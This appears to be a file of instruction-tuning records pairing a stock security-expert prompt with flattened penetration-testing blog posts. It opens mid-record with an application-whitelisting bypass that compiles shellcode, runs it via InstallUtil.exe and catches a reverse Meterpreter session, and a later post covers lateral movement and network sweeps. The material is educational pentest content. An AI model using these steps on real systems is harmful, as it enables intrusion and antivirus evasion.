InstallUtil-ShellCode.cs file and exit gedit In the same terminal window type the following to host the InstallUtil-ShellCode.cs file python m SimpleHTTPServer 80 On your Windows machine open a web browser and type the IP address of your Kali machine Download the InstallUtil-ShellCode.cs file from the directory listing Let's go ahead and compile the file using the csc.exe tool Open a command prompt change to your Downloads directory and compile the program by typing the following cd Downloads C Windows Microsoft.NET Framework v2.0.50727 csc.exe unsafe platform x86 out exeshell.exe InstallUtil-ShellCode.cs Hop back over to the Kali machine and let's start a Meterpreter listener by using msfconsole Kill the python server by hitting Ctrl-C in the terminal Then type the following replacing YOUR_IP with your Kali IP address msfconsole use multi handler set payload windows meterpreter reverse_tcp set LHOST YOUR_IP set LPORT 443 set ExitOnSession false run -j Head back to the Window's terminal Type the following to execute the shellcode program by using the InstallUtil.exe tool C Windows Microsoft.NET Framework v2.0.50727 InstallUtil.exe logfile LogToConsole false U exeshell.exe Checking the Window's task manager shows that just the InstallUtil.exe process is present and not our exeshell.exe file Pop back into the Kali machine and check out the msfconsole window Did you get a session In closing we've shown you one way to potentially bypass application whitelisting software The method was developed by Casey Smith The demo here looked at establishing a meterpreter session but the possibilities are endless for what code you can execute on the system Being able to compile the code on a Windows system without the need for Visual Studio is also a huge bonus This method can also be used to avoid both behavioral and signature-based anti-virus analysis This is one approach that you will definitely want to keep in your toolbox when it comes to assessing security tools Join the BHIS Blog Mailing List get notified when we post new blogs webcasts and podcasts jetpack_subscription_form show_only_email_and_button true custom_background_button_color undefined custom_text_button_color undefined submit_button_text Subscribe submit_button_classes undefined show_subscribers_total true"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Get to Know a Tester: Ethan Robish</title>\n<taxonomies>Author, Ethan Robish, Fun & Games, college, get to know a tester, internship, interview, my mom got me a job</taxonomies>\n<creation_date>Fri, 22 Apr 2016 15:48:45 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sierra Ward Ethan Robish Intro by Ethan Sierra came up with the idea to interview me for this blog I thought it was a great idea and after watching Rick and Gail's dynamic on the video they created the other day I thought it could be really fun too Our attempts at recording video failed Our attempts at recording audio mostly failed We got an audio recording that was akin to talking through these So instead you will find the transcript of our conversation __________ S Hi Ethan how are you E Hi I'm doing great How are you Sierra S Good So BHIS has been around since 2008 and you started right at the beginning right E Yeah pretty close S And how did you end up connecting with John and getting involved at that starting point E So BHIS as you know is based in the Black Hills I went to school in a city that is right in the middle of the Black Hills called Rapid City and there was a poster just a one page ad for an internship hanging on a bulletin board at my school It was my mom who actually noticed it and pointed it out I think it said something like Do you like to break things All you can drink Mountain Dew I called the number on the flyer John answered and he said nobody had called him in about six months and he didn't even think the flyer was there anymore But here I am He asked me a few questions on the phone and then he decided to meet me He lives about an hour away so we set up a time and he took me to sushi It was the first time I'd ever had sushi S Nice E So that was our interview and he hired me on as an intern while I was going to college S Cool Well I kind of love that your mom saw it and got you your first job E laughing Yeah she likes to bring that up too S What were you going to school for at that point E I started as a computer engineer but switched to computer science which is what I graduated with S Why did you make the switch E A couple of different reasons I decided I liked to program better mainly since there's a lot more immediate gratification versus tinkering with hardware and electronics S Okay yeah that makes sense And so did you know anything about pentesting when you started working with John E No no I didn't So when I first called John he kind of described what he did and I remember asking him Is this legal Do you have permission to do this kind of stuff I think he liked that I asked that question But no I didn't know this kind of job existed before I met John S Awesome I guess 2008 doesn't really seem that long ago but eight years has made a big difference in just how much the general public knows about hacking and computer stuff E Definitely The last few years it's been all over the news the media likes to bring up S It's one of those things that's really scary and nobody understands it so kind of perfect news E True I can understand why the news likes it S So then you were an intern working with John Was it just John by himself at that point Or were there other people working at BHIS E I think there were other people who were kind of coming and going also interns So BHIS at the beginning was kind of a black box at least to me I met John about two times in as many years I would correspond with him through email and I learned to be concise pretty quickly I would send him page long emails about what I'd been doing and asking for feedback and he'd send back if I was lucky a sentence but sometimes just a couple of words S Good Keep going E laughs S Yeah it's definitely kind of the same thing for me when I started John throws you in and you learn to swim E But back to your question I saw other people copied on emails randomly but it was never a thing where John told me Hey you're going to be working with this person or Hey I've got this other person and I'd like you to work with them I was just kind of in my own little world And then at one point during summer break I did a full-time internship with BHIS S What year were you when you started E I was just a freshman S So you started working with him right at the beginning of school then E Yeah and I think the internship was between my junior and senior years of college the full-time internship and I got to see John a lot more in person during that time S That helps E Yes S And then after you graduated were you still an intern Or did you go full-time at that point E After I graduated I actually went to Seattle for a summer and I did another internship there for a different company and immediately after that was hired on full-time for BHIS S Great And compared to when you started what is it like to work with BHIS now E I feel like there's parallels watching a child grow raising a child I've never done so myself but right at the beginning it's always kind of in the moment and then they grow and they grow and eventually they're old and maybe someone who you haven't seen in a while comes back and they say Oh my gosh your child has gotten so big but the parents are just like This is my child S It's hard to see the difference E Yeah it's hard to tell unless I really step back Back at the beginning when I was hired on there was one other full-time person who had been hired a few months before me Tim Tomes And so we worked together and pretty much everyone at BHIS is remote and definitely everyone at the beginning was remote We worked together and emailed back and forth and had online conversations but it was a year of working before I actually finally met Tim in person That was kind of strange Besides John I didn't meet my sole co-worker in person for a year S It's definitely different So do you like working at home How would you describe your experience working at home E It definitely has its ups and downs There are some benefits of working in an office But that being said I don't think I'd ever go back to working in an office full-time I really enjoy being able to work from home being able to have my own space and pace and think without too many other people to distract me S It's more fun to work in an office But there might be more fun and a little less work E Yeah S So when you're working can you describe a typical week or typical day Without getting into too much detail what are some of the things you work on and do or what is your routine E I don't think I've had a typical week since I've started laughs but I'll try my best to kind of summarize As I said things have changed quite a bit both at BHIS and my role has also changed quite a bit I still do testing but I've transitioned more to doing development recently So I wake up have breakfast get ready start up my computer and log in I try to avoid checking email first thing in the morning because otherwise that tends to be a black hole for me and before I know it half the day's gone and I don't know what I've done S laughs E So I usually try to figure out the night before what I need to get done and work on that before I open up the floodgates of email S Good plan Do you feel like you're better so nobody can multi task we're just flipping between mini tasks and not really getting anything done but you're saying that you try to have one focused project that you start the day with and you work on that E Yeah that's what my approach has been lately You talk about multi tasking I used to think I could multi task laughs as we mentioned it doesn't work so well I finally have learned that S Yeah I'm learning that more and more to not have 10 million web tabs open and just have one thing that I'm doing So what are the hours you usually keep E It changes so much I'm not really good about getting up in the morning I'm typically a night owl I also really don't like waking up to an alarm So unless I have something specific I need to be up for I try to just wake up naturally We have meetings and appointments that we have to manage within the company but outside of that we kind of set our own hours If I have something I have to do in the afternoon I can go do that and then come back and finish later that night and continue working S I do like the flexibility So you mentioned that you're involved in the R D on the development team How did you fall into doing that E I think it was just what I wanted to do I really liked doing pentesting and I really like doing development Something I learned working for BHIS and internships is that I flourish the best when I can switch between the two Not necessarily multitasking but if I can do one for a while like a few months or a half a year and then switch to the other one it helps me to come at it with a new enthusiasm and not get too bogged down doing the same thing S Yeah not get burned out or overloaded And it seems like maybe the dev comes from your experience pentesting Would you say that's accurate E Yeah I definitely have insights about what would be useful as a pentesting tool and where to focus my dev efforts to what would be most useful S So it's kind of really great that you like doing both of those things you can kind of stay in touch with the ways people are attacking and the things happening in info sec and go back and develop it more E Well it's what I prefer so I'm glad other people think it's good that I like to do both S Well I think it makes a lot of sense And from talking to some of the other testers that's one of the things that you really like about your jobs is that it's always different and always changing and that you're never even for the people that are doing straight pentesting it's different even from job to job even within the same industry because each job has different needs it's never too routine What would you say your least favorite part of R D is E I think for every programmer the least favorite part is debugging Probably the most favorite part is after you're debugged and you've actually solved something and figured out what was going wrong S A big endorphin rush E And it's the same thing with pentesting too It's really frustrating to beat your head against an application or a network over and over again but you know once you find that chink and you weasel your way in it's a pretty good feeling S Yeah well if it wasn't hard it wouldn't be fun E That's true actually there's a lot to be said for that S So for someone just wanting to get into this field the pentesting field do you have any advice you'd give them Look for random posters E Laughs Yeah keep an eye out for opportunities That's good advice all around But I think if they want to make themselves stand out probably the best thing to do is to get out there and try things Get experience If that means finding local groups that you can be a part of just to get your fingers on the pulse of the community that's good experience You just sort of absorb the mentality of the security mindset Or it can be competing in CTFs capture the flag competitions those are good Even if you don't have those available there's all sorts of hackable tests sites or test programs that you can find online that are specifically meant to teach you security concepts So just trying them You're going to learn the most by actually doing it As you're doing it you're trying to figure out why doesn't this work and by the time you've figured out how it works and why it works you've done all this research and you understand the issue and you can actually do it and you can replicate it It's one thing to read a blog post and say oh that makes sense but it's a completely different thing to actually go through it and replicate it on your own You're going to learn so much more and you're going to have a handle on the details then S That sounds like great advice And so that would be for someone entering the industry But from your perspective as a pentester what then would you have to say to maybe someone that is running a company or is on the IT staff of the company what can they do to make their company a little less vulnerable to attacks from pen testers but also from real bad guys E Okay so yeah companies that I've found to be the most successful or the most secure the one thing they all really have in common is that they really care about security The mindset of the company is like security is a priority to them A lot of companies will try to do double duty and they'll give it to their IT people they're having them do security on the side essentially And that might be a necessity due to budgets and just not having the skill-set available But to really thrive you kind of need some dedicated staff and you need the rest of the company no not have the mindset that they're adversarial The rest of the company shouldn't view the security people as they're just there to make your lives harder S So we need your passwords to be 40 characters long E laughs They should try to understand the importance of security try to cultivate why security is important And as we mentioned earlier the media constantly streaming that out into the open I think that helps Plus it gives companies incentive to make security important S Well I mean if I were running say a hospital seeing that hospitals are having 17 000 ransomware catastrophe that definitely makes me more aware of it There's times when we like to rag on the media but it definitely helps bring that to the public forefront So is there anything else you'd like to mention or talk about I feel like we got a good a glimpse into your experience and job E There is one more questions on the list What do you really enjoy about working a BHIS and I'd like to take a shot at that S Oh do do E My favorite part of working here is just the people we have working together It's hard working remotely You don't get to interact with your co-workers as much as if you worked in an office And it's just it's not the same as face to face interaction But one thing I really like is when we get together we usually get together at security conferences once a year or so or sometimes there will be a bunch of on a test together that's my favorite part Just being with people who are like-minded who care about security who you can say something completely technical out of the blue that your friends and family would think you're talking jibberish but they actually understand it and respond in kind That's my favorite part We've got some really great people at BHIS S I pretty much love it And you said it was nice to have like-minded people but I feel like I've worked in a lot of different industries myself and you can have like-minded people that still don't gel and one of the things that's really special about BHIS is that more than just having our job in common I feel like I'm not a pentester so I don't have your job in common but that we all have so much fun when we get together just I feel like John has done a good job of bringing people together that gel and work well together on top of having our or you guys's technical skill in common E Yeah S Well thanks for talking to me Ethan it's been awesome I feel like I learned a lot about you and I hope everybody listening feels the same way So thanks for the time E All right take care S Bye"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Internal Pivot, Network Enumeration, & Lateral Movement</title>\n<taxonomies>Author, External/Internal, Joff Thyer, Red Team, C2, internal pentest, ipconfig, ipconfig Output, l33t ninja, metasploit, pen-testing, Pentesting</taxonomies>\n<creation_date>Mon, 25 Apr 2016 16:27:49 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer Picture a scenario whereby you are involved in an internal network penetration test Perhaps you have succeeded with a spear-phishing campaign and landed on an internal system or perhaps you have been placed there to begin with Being the l33t ninja penetration tester that you are you lead with some low n slow outbound port scanning and quickly realize you have a handful of useful TCP ports available for Command and Control C2 communications Either using your pre-existing C2 channel or by establishing another one you begin to look for privilege escalation Naturally you whip out good old PowerUp from the Empire project as well as your favorite method to examine group policy preferences You are lucky today and find that there is a DLL hijack opportunity as well as credentials within the Group Policy Preferences XML files Taking the easy route you use the Group Policy Preferences credentials and establish a privileged C2 channel using trusty PSEXEC or WMI After that you go ahead with your usual routine to learn more information Windows commands like 'net view domain 'net localgroup administrators 'net group Domain Admins domain and 'net group Domain Controllers domain You also go ahead and check out User-Hunter from Empire in order to find where all the domain admins have logged in You proceed with some DNS lookups against the domain controller names and get a pretty good sense of where in the network these systems live You quickly learn that the environment is pretty large with dedicated sub-networks for client systems as well as dedicated sub-networks for server systems After that you begin to wonder how the rest of the client-side network is put together You know it has sub-networks but like so many organizations your customer uses a class B network 16 on the inside and you really want to get a sense of where all the client-side subnets are One great start is your own network adapter You type the 'ipconfig command and learn that you are sitting in a class C network ipconfig Output From here you can make some observations Namely that you have an address in a class C 24 address space with a router gateway address of the network address 10.99.1.0 in this case plus one You are dying to crank loose some smb_login scans with Metasploit so you can login to other systems You know you can target some individual systems found with user-hunter but you don't want to miss any really cool devices for expanded attack surface opportunities With some l33t consulting from some former enterprise network architect people you have a pretty good idea that almost all of the router gateways in this environment will probably observe the same convention of being the network address plus one You can also make the assumption that if you are sitting in a class C address space then a pretty good part of the network is probably architected the same way Since internal routers very rarely filter ICMP traffic then you can go on an internal router gateway hunt using ICMP echo requests and a DOS batch file loop command C FOR L X IN 1 1 254 do PING -i 3 -w 1 -n 1 10.99 x.1 FIND bytes Let's break the PING command arguments down to understand this a little better -i 3 set the IP TTL to 3 hops maximum stay pretty local in other words -w 1 wait only 1 second for a response -n 1 send only one packet The result of doing this should reveal all the potential router gateways on the network which in turn lets you know where other client server sub-networks reside in the environment Sample ICMP Echo Replies The results above also yield some other potential information Where the TTL returned is 255 you are getting answers in your local subnet Where the TTL returned is 254 you are probably getting answers in the same LAN campus location as where your system is connected Where the TTL is 253 or even less you may well be pinging router gateways in a remote branch office or other campus location You might have to experiment a little with the -i 3 parameter if the network is larger and involves perhaps MultiProtocol Label Switching MPLS In the case of MPLS the TTL might or might not be decremented across the MPLS cloud router hops This is a provider dependent decision I would recommend starting with -i 3 and going up as high as -i 9 to capture most of the network scope Anything that is not local would be routed to the gateway of last resort and will result in a TTL expired in transit method response or in more sophisticated environments might be routed to a black hole sink destination Happy pen testing all"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>TestSSL.sh Assessing SSL/TLS Configurations at Scale</title>\n<taxonomies>Author, David Fletcher, External/Internal, Red Team, cool stuff, shell script, SSL, testssl.sh, TLS, tools</taxonomies>\n<creation_date>Wed, 27 Apr 2016 13:13:36 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher Have you ever looked at Nessus scan results to find the below in the output Recently I was on engagement and encountered just this situation I found myself wondering how in the world I would validate all of these findings for SSL TLS Luckily one of my co-workers suggested I take a look at testssl.sh This tool sped up the process significantly and I found that I could do some really great things with its output Before we get into testing at scale we should become familiar with the tool and its output As you've probably already guessed testssl.sh is a shell script that interrogates SSL and TLS configurations to provide comprehensive information on the protocols and cipher suites supported by a service The tool can be found on GitHub at ithub.com drwetter testssl.sh There are a number of options that can be used to run very specific tests against a service specific protocols cipher suites vulnerabilities etc However since there are numerous findings and a single host is likely to match multiple of those we'll opt to run all tests no arguments This will provide a great deal of flexibility in reporting It is worth noting that testssl.sh can evaluate non-HTTP services as well This article will focus only on HTTP services Run against a single host from a terminal testssl returns output that looks very nice with colorization in the terminal output However this is somewhat limiting in that it restricts the tester to taking screen captures rather than providing a customer an actual report as output The terminal coloring that testssl.sh outputs is ANSI Escape Code As a result terminal control sequences are intermingled with the output text This could be troublesome but there just happens to be a tool named aha ANSI HTML Adaptor for Linux that will convert the output that testssl.sh generates into an HTML page as illustrated below I've found that piping output from testssl.sh through aha has a couple of drawbacks First testssl.sh sometimes hangs while enumerating the ciphers supported by SSLv3 If this occurs we have to break out of the command CTRL-C which kills both evaluation and reporting I've also found that aha sometimes encounters a broken pipe error and hangs waiting for input to proceed Once again reporting and evaluation both fail due to this issue For both of these reasons the best strategy for testing at scale involves the following two steps First run testssl.sh in a for loop feeding IP addresses of the hosts under test from a file and limit the runtime of the process If you really want to speed things up you can use xargs to make the whole process multi-threaded Next capture the raw output from testssl.sh and process it with aha after all of the raw output has been generated Doing so will allow you to build custom reports focusing on only the details of a specific finding The raw output will have full details included in it This means that you can run testssl.sh one time and create custom reports for each individual finding listed Let's walk through the process The first thing you need to do is grab the target IP addresses from the Nessus results One great way to do this is to use EyeWitness This tool is best known for assisting in performing quick triage of Nessus scan results EyeWitness will consume a .nessus file and produce an HTML report with screen captures of all web servers or rdp vnc found in the report The option that we're interested in the --createtargets switch This takes the Nessus file and creates a list of URLs in the output text file With the target list generated the for loop can be built to begin scanning The following syntax will iterate through each of the URLs Nessus was configured NOT to resolve names in the targets file for FILE in cat https_targets.txt do IP echo FILE cut -d -f 3 timeout 20 opt testssl testssl.sh FILE IP.txt done Each host will be scanned with a timeout of 20 seconds and the output will be piped into a text file with the naming convention .txt Using the timeout command allows us to avoid the issues with cipher enumeration hangs Since we're outputting to a text file we also don't get broken pipe issues with aha Note that the timeout value should be tuned to the environment you're working in to ensure that all output from testssl.sh is captured Once scanning is complete we can use the output files to create custom reports that are purpose built for a particular finding As an example the cat and egrep commands are used below to gather all of the SSLv2 results from the text files created as a result of scanning The output produced by this command can also be piped through aha to produce an HTML report that is specific to this finding An example HTML report can be seen below So go grab a copy of testssl.sh and let your imagination run wild This tool generates output that is very easy to parse into reports that are focused on specific issues that need to be addressed Don't forget that validation doesn't stop here If you find something that is exploitable heartbleed shellshock etc make sure that you demonstrate exploitation and put it into context for the organization"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>5 Reasons for Mailvelope & Easy Instructions</title>\n<taxonomies>General InfoSec Tips & Tricks, InfoSec 201, encrypted email, encryption, gpg, mailvelope, passphrase, pgp codes, thunderbird</taxonomies>\n<creation_date>Fri, 29 Apr 2016 14:02:31 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Gail Menius My husband set me up with GPG and Thunderbird and it was too hard Ethan said it was cool Lots of people gave it good reviews It's open source John thought a blog post about mailvelope would be a good idea 1 My husband set me up with GPG and Thunderbird and it was too hard to use When I first started working for BHIS I told my husband that I needed a key or something for email and I also needed to encrypt my hard drive Here is the explanation he gave me Give me your computer and I'll fix it I was like Ok Thanks Because to be quite honest I was too busy to learn So then I continued in ignorance for a while He set me up with something called firebird no that's a ballet ....Thunderfox nope that's literally nothing I've ever heard of before Firefox nope that's a browser UUUUm it was a mail application that uses keys if you want it to Ugh he just previewed my blog and said he did something with Enigmail because something nerdy nerd nerd doesn't support a blah blah firebird And then I knew that sometimes people were sending me things that were encrypted and I knew I needed their key and I was scared to ask because I didn't know if it was automatically sent to me or I should just know where it was I was so scared Why why why didn't I know how to encrypt email 2 Ethan said it was cool But then Ethan came to visit the Rapid City office He is such a neat guy He taught me how to use Mailvelope And use email filters oooooooooh email filters I'm not sure why but Mailvelope just seemed intuitive I used it on my gmail I thought I would show you how to do it on your gmail Hold your horses it's at the END of the post 3 Lots of people gave it good reviews There are over 200 000 users It got an average of 4.55 stars out of 5 People love it But when I went to download the extension something scary happened It asked me if I wanted to let Mailvelope read and change all my data on the websites I visit WHAT DOES THAT MEAN SO I clicked view details OOOH NOOOOO NOW it gets complicated How am i going to tell if I can trust this thing Do I trust it just because Ethan says so DO I read reviews Do I know anyone who is a subject matter expert I'll tell you what I learned Mailvelope is based on this thing called PGP pretty good privacy and a guy almost got in trouble for developing PGP Are you down with PGP Because Phil Zimmerman is And he's a fellow something important about law and Stanford 4 It's open source I also learned that it is OPEN SOURCE and you can see the code on GITHUB I can explain what that means too I only really know because my husband chatters about open source all the time ALL THE TIME Apparently it's super nice to write open source code It's code that you can see how it works see all the lines in it You can also make it your own alter it to suit your needs It helps the community Check out how this blog on Creative Commons about how government code should always be open source Ohhh wouldn't that be cool if our tax dollars paid for code we could use for free Some people say you can't send secure attachments using Mailvelope But I usually just hear of people using box or sending things using encrypted zip so I wasn't too concerned with that so Mailvelope was looking good 5 John thought a blog post about mailvelope would be a good idea Everyone at BHIS contributes to the blog It's important to cultivate a culture or sharing When I mentioned that I was going to do a blog post on Mailvelope he thought it was a good idea What he didn't know was that now Heather and I can send secret messages about him using our work email Gail thinks Mailvelope is cool because she can send super secret messages with it to Heather that no one else can read Which is super cool because John has the ability to read everyone's email at BHIS and sometimes She doesn't want him to do that Not that he's nosy or that she has any secrets Please ignore the fact that she and Heather could have used personal email accounts Directions Go to Mailvelope And download the extension for Chrome This is the extension icon on Chrome once you've downloaded it An electronic menu slides down from the extension bar See options in blue I know it's small but you can see it on your own browser The menu on the left helps lead you to a page you can use to Generate your own key You'll need one if you want to send Heather secret messages It WILL ASK YOU FOR A PASSPHRASE Remember it Don't write it down Don't even joke about taping it to the back of your keyboard It may let you generate a blank key don't do that either Then you freak out because you've generated a key but you don't know where it is Lucky for me it was just hiding under key pairs in Display keys Import your friends keys so you can whisper email secrets to them You have to copy and paste the text of their keys But if you have txt files you can upload them instead Send a super secret email When you go to your gmail you can see this weird floating email box looking thing Click that and start writing your secrets It'll ask you who you want to encrypt the message for and which key to use to decrypt it It's pretty intuitive after that After you click send it'll ask for that passphrase again Always remember your passphrase There's no prompting to help you remember in this program Just remember it or it's lost FOREVER There's nothing more embarrassing than having your security friends find out you forgot your passphrase Or is there Control the Key During the creation of this blog I couldn't find the key I generated at first I sent out an email to the testers and told them I lost the key Sally and Ethan were both online and talked a bit about the game of the key Sally thought that I should include a bit about keeping control of the key She said that maintaining control of the key is PARAMOUNT she also said When you lose the key or worse yet someone else gets their hands on it it's game over I think it would be super scary if someone could pretend to be me in email So I better train this key to stay in the yard or get an invisible fence I asked Ethan what to do when I thought I had lost they key and he said that Exposure of a private key definitely means you should generate a new key and issue a revocation of your old one if you can Next blog I'm going to act like I actually lost the key and tell you how to fix it if you do References Credits ifehacker.com how-to-encrypt-your-email-and-keep-your-conversations-p-1133495744 Ethan Robish email communication March 28 2016 Sally Vandeven email communication March 28 2016 Photos Click on all photos for their reference All used via Creative Commons"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Ansible for Lazy Admins</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, Jordan Drysdale, ansible, Config management, CSC #2, lazy admin</taxonomies>\n<creation_date>Mon, 02 May 2016 21:38:41 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale For the lazy server and system admins automating those boring functions of updating packages finding outdated ones checking scans et cetera Ansible has some very nice features Here is a quick breakdown on some of those features I have found to be very useful throughout post useful stuff in bold First do yourself a favor and run through the best practices here This software is useful and amazing for so many reasons best summarized as agentless ssh key-auth based systems administration For the security minded admins review CSC 2 Inventory of Authorized and Unauthorized Software here Let's say we approve only a particular kernel version and need to know if we have servers that have fallen out of line with approvals system ansible droplets -m shell -a dpkg -l grep linux-image -u ansible -K ii linux-image-3.13.0-85-generic 3.13.0-85.129 amd64 Linux kernel image for version 3.13.0 on 64 bit x86 SMP ii linux-image-extra-3.13.0-85-generic 3.13.0-85.129 amd64 Linux kernel extra modules for version 3.13.0 on 64 bit x86 SMP Or if we have a version of everyone's second favorite text editor that has been identified in a recent CVE system ansible droplets -m shell -a dpkg -l grep nano -u ansible -K 11.22.33.44 SUCCESS rc 0 ii nano 2.2.6-1ubuntu1 amd64 small friendly text editor inspired by Pico 33.44.55.66 SUCCESS rc 0 ii nano 2.2.6-1ubuntu1 amd64 small friendly text editor inspired by Pico The above chunked commands are considered ad-hoc Let's take a look at a YAML file to see what a playbook looks like Playbooks can be run against all hosts or subsets depending on your hosts.conf file This is an apt specific .yml file for updating all packages It can't be that easy can it I can run this on ALL of my servers at once Yup and let's do it system etc ansible ansible-playbook -l droplets roles common tasks apt.yml -u ansible -K PLAY all TASK setup ok 11.22.33.44 ok 33.44.55.66 TASK Check if there are packages available to be installed upgraded changed 11.22.33.44 changed here means apt-get upgrade changed 33.44.55.66 TASK Upgrade all packages to the latest version changed 11.22.33.44 changed here means apt-get upgrade changed 33.44.55.66 TASK Check if a reboot is required ok 11.22.33.44 ok 33.44.55.66 TASK Reboot the server skipping 11.22.33.44 skipping 33.44.55.66 PLAY RECAP 11.22.33.44 ok 4 changed 2 unreachable 0 failed 0 33.44.55.66 ok 4 changed 2 unreachable 0 failed 0 Okay that's fine and dandy how about a reboot and a quick check of uptime These .yml files are super simple very useful and extremely handy Again if you were lazy and didn't want to touch much of anything you might want to start digging in to Ansible's functionality Commands for these system etc ansible ansible-playbook -l droplets roles common tasks reboot.yml -u ansible -K system etc ansible ansible-playbook -l droplets roles common tasks uptime.yml -u ansible -K Next let's say I have a very standard way of deploying ssh across my servers and I want it to be super easy My ssh.yml file will look like this hosts all become yes tasks name configure ssh options to system spec template src etc ansible roles common templates ssh.conf.j2 dest etc ssh sshd_config notify restart ssh force ssh update tags ssh name be sure ssh is running and restarted service name ssh state restarted enabled yes tags ssh Note the ssh.conf.J2 this is a standard for deploying templates with Ansible I have also invested a fair amount of time in creating similar YAML files for deploying ntp fail2ban filebeat sendmail nginx and a ton of other packages My favorite one so far and that is earning me the best of the laziest title takes a combination of iptables to filter server access services by whitelist then deploys fail2ban with a generic jail.local file to block malicious auth attempts against various services Then lastly it dumps a fully TLS enabled filebeat logger back through a firewall port into an elk stack Iptables hosts all become yes tasks name CAREFUL deploy canned iptables ruleset CAREFUL copy src etc ansible roles common templates iptables.rules.j2 dest etc iptables.rules tags iptables name CAREFUL deploy firewall u x file to enable iptables rules CAREFUL copy src etc ansible roles common templates firewall.j2 dest etc network if-up.d firewall mode a x tags firewall Fail2ban hosts all become yes tasks name Install fail2ban apt pkg fail2ban state installed update-cache yes register fail2ban_install tags fail2ban name Install config template src jail.local.j2 dest etc fail2ban jail.local notify reload fail2ban Filebeat hosts all become yes tasks name add apt_key for filebeat apt_key url ackages.elasticsearch.org GPG-KEY-elasticsearch state present tags apt_key filebeat name add apt_repo for elastic software apt_repository repo deb ackages.elastic.co beats apt stable main tags filebeat repo name install filebeat apt pkg filebeat state installed update_cache true tags filebeat name create remote directory structure etc pki tls certs file path etc pki tls certs state directory mode 0755 tags filebeat tls directories name copy over the tls verification cert for secure logging copy src etc ansible roles common files logstash-forwarder.crt dest etc pki tls certs mode 0755 notify restart filebeat tags filebeat name deploy standardized internal network config via template template src etc ansible roles common templates filebeat.conf.j2 dest etc filebeat filebeat.yml tags filebeat config template name be sure filebeat is running service name filebeat state restarted enabled yes tags filebeat Basically from a Linux administration perspective Ansible is an excellent choice What we just went through here is basically still entirely ad-hoc I stand up a server create a new user called Ansible add some keys for authentication and start running playbooks and command scripts Even better we can use roles to do almost all of this for us and if we are using AWS or Digital Ocean Even better yet we can pre-bake keys and users If you get to this point take a look at this last hyperlink it describes how to bake all of your .yml scripts into a single playbook for use as a bootstrapper Build a Linux box add a key for Ansible to authenticate with in five minutes I have a system online fully firewalled logging enabled configured to spec completely patched booted and contributing services to digital hyperspace"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>15 Ways to Be a Safer Computer User</title>\n<taxonomies>General InfoSec Tips & Tricks, InfoSec 101, basic stuff, dark alleys, internet safety, listicles, safe computer usage, tips for your mom, your mom</taxonomies>\n<creation_date>Fri, 06 May 2016 17:54:46 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sierra Ward Editor's note Though infosec professionals may see this advice as basic to the point of being obvious as we visit with people and interact with swaths of other industries we realize that it isn't Even if you know about security you know many people who think even basic information security is an enigma ie your mom Sometimes when we know very advanced stuff it's hard to explain the most basic steps but the most basic steps have value so share this with someone you care about A couple of months ago I was reading the newspaper and saw that our small town was having a rash of car break-ins Horrified I read the articles closely They were happening at a certain time and place and then I read a quote from a police officer People are advised to take their keys with them when leaving the vehicle lock their doors and keep all valuables out of sight Apparently the thieves had walked up to unlocked cars taken wallets out of purses left on front seats and realized it was so easy they'd done it several times facepalm It's easy to live in a small town and think that the evils of the world can't touch us The way we deal with our computers is very similar to this we assume that nobody would care or be interested in what we are doing online or have on our computers and that we don't need to really take information security very seriously But that's as foolish as leaving your keys in the car with your wallet on the front seat First let's establish that bad guys will do bad things nothing will stop someone that's motivated to do those bad things A thief can 